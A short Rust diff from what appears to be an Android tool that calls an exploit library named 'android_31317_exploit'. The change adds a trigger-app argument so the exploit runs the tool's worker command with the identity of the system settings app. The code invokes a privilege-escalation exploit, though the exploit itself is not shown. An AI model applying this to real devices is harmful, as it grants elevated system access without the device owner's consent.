@@ -1,6 +1,6 @@
 use std::{io::ErrorKind, path::PathBuf, thread::sleep, time::Duration};
 
-use android_31317_exploit::exploit::{ExploitKind, build_and_execute};
+use android_31317_exploit::exploit::{ExploitKind, TriggerApp, build_and_execute};
 
 use crate::{error::Error, protocol::DataFrame, socket::connect_worker};
 
@@ -48,6 +48,10 @@ fn start_worker(executable: PathBuf) -> Result<(), Error> {
         "com.android.settings",
         "platform:system_app:targetSdkVersion=29:complete",
         &ExploitKind::Command(format!("{} worker", executable.display())),
+        &TriggerApp::new(
+            "com.android.settings".into(),
+            "com.android.settings.Settings".into(),
+        ),
         None,
     )?)
 }
